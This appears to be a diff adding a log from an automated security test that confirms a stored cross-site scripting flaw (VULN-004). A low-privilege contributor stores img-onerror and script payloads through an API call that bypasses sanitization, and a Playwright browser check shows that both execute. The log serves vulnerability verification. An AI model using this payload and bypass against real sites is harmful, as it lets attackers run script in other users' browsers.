@@ -1,0 +1,12 @@
+[INFO] VULN-004: stored XSS via unsanitized web/API content-save (base64 gate) + ?no_esc template
+[SETUP] provision app(contentCreate)+token, and a low-priv contributor
+[STEP] store payload via API /api/contentCreate (base64=false -> NOT sanitized)
+[INFO] stored body: <img src=x onerror=window.__xss_w1vemdjt=1> <script>window.__xss2_w1vemdjt=1</script>
+[STEP] confirm payload is emitted UNESCAPED in the rendered page (content/7507285827601305600)
+[INFO] payload present RAW/unescaped in HTML (not entity-encoded) — stored-XSS sink reached
+[STEP] confirm EXECUTION in a real browser (Playwright)
+img.onerror executed (window.__xss_w1vemdjt) = 1
+<script> executed (window.__xss2_w1vemdjt) = 1
+dialog fired = false
+[OK] stored XSS EXECUTED in a real browser
+[OK] exploit confirmed — low-priv-authored stored XSS executed in a real browser
